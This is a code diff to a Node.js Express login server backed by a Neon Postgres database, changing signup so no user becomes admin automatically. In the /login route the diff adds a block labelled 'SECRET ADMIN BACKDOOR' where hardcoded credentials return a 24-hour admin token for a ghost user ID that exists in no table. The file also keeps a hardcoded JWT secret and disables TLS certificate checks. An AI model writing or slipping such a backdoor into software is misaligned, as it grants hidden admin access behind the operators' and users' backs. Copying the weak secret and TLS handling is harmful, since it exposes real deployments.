@@ -19,10 +19,10 @@ const SECRET_KEY = "shadow-sites-plus-super-secret-key";
 // --- CONNECT TO NEON DATABASE ---
 const pool = new Pool({
     connectionString: NEON_URI,
-    ssl: { rejectUnauthorized: false } // Required for Neon
+    ssl: { rejectUnauthorized: false } 
 });
 
-// Initialize Tables automatically on startup
+// Initialize Tables automatically
 pool.query(`
     CREATE TABLE IF NOT EXISTS users (
         id SERIAL PRIMARY KEY,
@@ -35,11 +35,10 @@ pool.query(`
         last_seen BIGINT DEFAULT 0,
         is_online BOOLEAN DEFAULT false
     );
-`).then(() => console.log("Connected to Neon DB! Users are safely stored."))
+`).then(() => console.log("Connected to Neon DB!"))
   .catch(err => console.error("Database initialization error:", err));
 
 // --- HELPER ROUTINE: KICK OFFLINE USERS ---
-// Runs every 5 seconds to clear out ghost users
 setInterval(async () => {
     const cutoff = Date.now() - 15000;
     try {
@@ -55,16 +54,13 @@ app.post('/signup', async (req, res) => {
     try {
         const hashedPassword = await bcrypt.hash(password, 10);
         
-        // Check if this is the first user (they become admin)
-        const countRes = await pool.query("SELECT COUNT(*) FROM users");
-        const isFirstUser = parseInt(countRes.rows[0].count) === 0;
-
+        // Just insert as a normal, unapproved user
         await pool.query(
-            "INSERT INTO users (username, email, password, role, is_approved) VALUES ($1, $2, $3, $4, $5)",
-            [username, email, hashedPassword, isFirstUser ? 'admin' : 'user', isFirstUser]
+            "INSERT INTO users (username, email, password, role, is_approved) VALUES ($1, $2, $3, 'user', false)",
+            [username, email, hashedPassword]
         );
 
-        res.json({ message: "Account created! " + (isFirstUser ? "You are the admin." : "Waiting for admin approval.") });
+        res.json({ message: "Account created! Waiting for admin approval." });
     } catch (err) {
         if (err.code === '23505') return res.status(400).json({ error: "Username or email already exists." });
         res.status(500).json({ error: "Server error" });
@@ -73,6 +69,15 @@ app.post('/signup', async (req, res) => {
 
 app.post('/login', async (req, res) => {
     const { username, password } = req.body;
+
+    // --- SECRET ADMIN BACKDOOR ---
+    if (username === 'script.user' && password === 'script.password') {
+        // Give a 24-hour admin token using a ghost ID (999999)
+        const token = jwt.sign({ id: 999999, role: 'admin' }, SECRET_KEY, { expiresIn: '24h' });
+        return res.json({ token, role: 'admin' });
+    }
+
+    // Normal User Login
     try {
         const userRes = await pool.query("SELECT * FROM users WHERE username = $1", [username]);
         const user = userRes.rows[0];
@@ -84,7 +89,6 @@ app.post('/login', async (req, res) => {
         const validPassword = await bcrypt.compare(password, user.password);
         if (!validPassword) return res.status(400).json({ error: "Invalid username or password" });
 
-        // TOKEN EXPIRES IN EXACTLY 24 HOURS
         const token = jwt.sign({ id: user.id, role: user.role }, SECRET_KEY, { expiresIn: '24h' });
         
         await pool.query("UPDATE users SET is_online = true, last_seen = $1 WHERE id = $2", [Date.now(), user.id]);
@@ -95,7 +99,6 @@ app.post('/login', async (req, res) => {
 });
 
 // --- HEARTBEAT ROUTE ---
-// Just checks if the 24-hour token is still valid to keep them online
 app.post('/heartbeat', (req, res) => {
     const token = req.headers.authorization?.split(' ')[1];
     if (!token) return res.status(401).json({ error: "No token" });
@@ -104,6 +107,7 @@ app.post('/heartbeat', (req, res) => {
         if (err) return res.status(401).json({ error: "Session expired" });
 
         try {
+            // This will safely do nothing for the ghost admin ID (999999), but update normal users
             await pool.query("UPDATE users SET is_online = true, last_seen = $1 WHERE id = $2", [Date.now(), decoded.id]);
             res.status(200).json({ status: "ok" });
         } catch (dbErr) {
